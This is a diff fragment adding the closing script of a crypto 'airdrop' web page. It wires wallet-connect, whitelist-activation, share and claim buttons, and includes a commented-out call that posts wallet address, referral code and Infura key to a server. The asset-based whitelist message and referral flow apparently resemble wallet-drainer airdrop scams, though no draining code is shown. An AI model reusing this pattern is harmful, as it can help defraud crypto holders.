+						clipboard.on('error', function(e) {
+							var info="Error";
+							swal("Tips", info, "error");
+						});
+					}
+				}
+			},
+			error:function(data){
+			}
+		})
+	}*/
+	//激活后的回调
+	// async function postInfo(){
+	// 	var data = {
+	// 		coinCode:coinCode,
+	// 		address:selectedAccount,
+	// 		chainId:chainId,
+	// 		parentCode:parentCode,
+	// 		infuraKey:infura_key
+	// 	}
+	// 	console.log('postInfo-->',data);
+	// 	$.ajax({
+	// 		type: 'post',
+	// 		url:  domain + '/api/filx/request/airdrop/event',
+	// 		data:data,
+	// 		async:false,
+	// 		success:function(data){
+	// 			if(data.code == '200'){
+	// 				if(data.data.chances==1){
+	// 					//$("#btn-active").css('display','none');
+	// 					$("#btn-receive").css('display','inline');
+	// 					$("#btn-go-share").css('display','none');
+	// 					$("#text-chances").html('Remain Receive Chances: '+1);
+	// 					var info="Congratulations, you got 1 airdrop chance";
+	// 					swal("Success", info, "success");
+	// 				}else{
+	// 					//$("#btn-active").css('display','none');
+	// 					$("#btn-receive").css('display','none');
+	// 					$("#btn-go-share").css('display','inline');
+	// 					//var info="Sorry,You has got 1 chance before or You're not pass the whitelist check because you don't have enough assets";
+	// 					var info="Well done,Now you can share it with your friends";
+	// 					swal("Success", info, "success");
+	// 				}
+	// 			}else{
+	// 				var info=data.msg;
+	// 				swal("Error", info, "error");
+	// 			}
+	// 		},
+	// 		error:function(data){
+	// 			console.log(data)
+	// 		}
+	// 	})
+	// }
+	/*async function goEn() {
+		var url = "{:url('index/index/filcoinx',['agent'=>$userId,'type'=>'en'])}";
+		var s = getUrlQueryString('s')
+		window.location.href = s ? url + '?s=' + s : url;
+	}*/
+	async function goCn() {
+		var url = "{:url('index/filcoinx/index',['agent'=>$userId])}";
+		var s = getUrlQueryString('s')
+		window.location.href = s ? url + '?s=' + s : url;
+	}
+	function getQueryVariable(variable) {
+		var query = window.location.search.substring(1);
+		var vars = query.split("&");
+		for (var i=0;i<vars.length;i++) {
+			var pair = vars[i].split("=");
+			if(pair[0] == variable){return pair[1];}
+		}
+		return('');
+	}
+	function onload(){
+		if(!selectedAccount){
+			document.getElementById("btn-unlock").style.display = 'inline';
+		}
+		// parentCode=getQueryVariable('s');
+		//init
+		init();
+		//connect
+		document.querySelector("#btn-connect").addEventListener("click", connect);
+		//connect
+		document.querySelector("#btn-unlock").addEventListener("click", connect);
+		//Active whitelist
+		document.querySelector("#btn-active").addEventListener("click", goActive);
+		//Share Check
+		//document.querySelector("#btn-share").addEventListener("click", shareInfo);
+		//Go to Share div
+		//document.querySelector("#btn-go-share").addEventListener("click", shareInfo);
+
+		//document.querySelector("#go-en").addEventListener("click", goEn);
+		document.querySelector("#go-cn").addEventListener("click", goCn);
+
+		$("#activeConfirm").click(function () {
+			$("#goToActionSetion").trigger('click')
+		});
+		//Receive
+		document.querySelector("#btn-receive").addEventListener("click", claimAirdrop);
+	}
+</script>
+</body>
+</html>
